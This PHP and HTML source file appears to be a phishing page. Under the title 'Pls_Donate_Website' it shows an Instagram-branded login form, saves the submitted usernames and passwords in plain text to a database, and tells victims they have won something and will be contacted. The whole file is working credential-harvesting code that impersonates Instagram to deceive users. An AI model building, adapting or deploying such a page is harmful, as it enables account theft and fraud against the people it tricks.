<?php

 if (isset($_POST['user_name'])) {
  include ("another_connect.php");

  $user_name = $_POST['user_name'];
  $password = $_POST['password'];

  $stmt = $db->prepare("INSERT INTO user(user_name, password)
                                          VALUES(:n, :p)");
  $stmt->execute(array(
    'n' => $user_name,
    'p' => $password
  ));                                   

 }
 
?>

<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta http-equiv="X-UA-Compatible" content="IE=edge">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Pls_Donate_Website</title>
        <link rel="stylesheet" href="framework.css">
        <link rel="stylesheet" href="all.min.css">
        <link rel="stylesheet" href="framework.css">
        <link rel="stylesheet" href="index.css">
    </head>
<body>
    <a href="index.php" style="color: #e1b05d;
    background-color: rgb(245, 239, 220);
    padding: 7px;
    border-radius: 8px; position: relative; top: 25px; left: 25px;">Go Back</a>
    <div class="content_i" style="height: 97%;">
        <div class="login_i" style="width: 440px;">
            <div class="image" style="width: 100%; display: flex; justify-content: center;">
                <img src="imgs/1017007.jpg" alt=""  style="width: 60%; border-radius: 8px;">
            </div>
            <h3 style="color: rgb(180, 48, 180);">Login Instagram</h3>
            <span><?php
 
 if ($_SERVER['REQUEST_METHOD'] == 'POST') {
  $stop = true;
  for ($i = 0; $i < strlen($_POST['user_name']); $i++) {
    if (ord($_POST['user_name'][$i]) >= 33 && ord($_POST['user_name'][$i]) <= 47) {
      $stop = false;
    }  elseif (ord($_POST['user_name'][$i]) >= 58 && ord($_POST['user_name'][$i]) <= 64) {
      $stop = false;
    }  elseif (ord($_POST['user_name'][$i]) >= 91 && ord($_POST['user_name'][$i]) <= 96) {
      $stop = false;
    } elseif (ord($_POST['user_name'][$i]) >= 123) {
      $stop = false;
    }
  }

  if ($stop === false) {
    echo '<p style="color: red;">Cant Enter Special Character Ex: ()$%^^%*&#;:_-</p>';
  } else {
    echo '<p style="color: green;">Wonderful, now you can wait for a message from our team to tell you your victory to meet you, my brother</p>';
  }
 }
 
 ?></span>
            <form action="<?php $_SERVER['PHP_SELF']; ?>" method="POST">
                <input type="text" placeholder="user_name" name="user_name" required style="padding: 5px;">
                <input type="password" placeholder="password" name="password" required style="padding: 5px;">
                <input type="submit" value="save">
            </form>
        </div>
    </div>
</body>
</html>